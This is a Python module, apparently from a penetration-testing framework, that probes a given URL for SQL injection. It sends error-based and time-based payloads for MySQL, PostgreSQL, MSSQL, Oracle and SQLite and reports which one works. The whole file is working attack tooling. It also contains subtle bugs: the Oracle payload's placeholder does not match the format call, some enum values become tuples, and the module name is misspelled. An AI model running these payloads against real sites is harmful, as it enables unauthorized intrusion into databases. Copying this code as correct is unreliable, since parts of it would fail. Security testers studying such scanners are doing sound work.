import enum
import time

import requests

from module import Module, Type
from utils.others import read_wordlist


class DBMS(enum.Enum):
    MySQL = "MySQL",
    PostgreSQL = "PostgreSQL",
    MSQL = "MSQL",
    Oracle = "Oracle"
    SQLite = "SQLite"


COMMENT = "-- "

PAYLOADS_ERROR = [
    """' or '1'='1'"""
]

ERROR_MESSAGES = list(read_wordlist("data/payloads/sql_errors.txt"))

PAYLOADS_TIME_BASED = [
    (DBMS.MySQL, """1' + sleep({time})"""),
    (DBMS.PostgreSQL, """1' || pg_sleep({time})"""),
    (DBMS.MSQL, """1' WAITFOR DELAY '0:0:{time}'"""),
    (DBMS.Oracle, """1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',{sleep})"""),
    (DBMS.SQLite, "1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({time}00000000/2))))")
]


class SQLInjection(Module):

    def __init__(self):
        super().__init__("slq_injection",
                         ["sql", "injection", "web"],
                         "find and exploit sql injections")

        self.add_option("URL", "url", required=True, type=Type.string)
        self.add_option("DATA", "post request data", required=False, type=Type.string)
        self.add_option("TIME", "time to wait for time based sqli (in seconds)", required=True, default=2, type=Type.int)

    def error_based(self):
        for payload in PAYLOADS_ERROR:
            resp = requests.get(self.url + payload)
            if any(error in resp.text for error in ERROR_MESSAGES):
                print("error based sql-injection")
                print("payload:", payload)
                break

    def time_based(self):
        for dbms, payload in PAYLOADS_TIME_BASED:
            start = time.time()
            requests.get(self.url + payload.format(time=self.time) + COMMENT)
            end = time.time()

            if end - start >= self.time:
                print("time based sql-injection found")
                print("dbms:", dbms.value)
                print("payload:", payload)
                break

    def run(self):
        self.error_based()
        self.time_based()
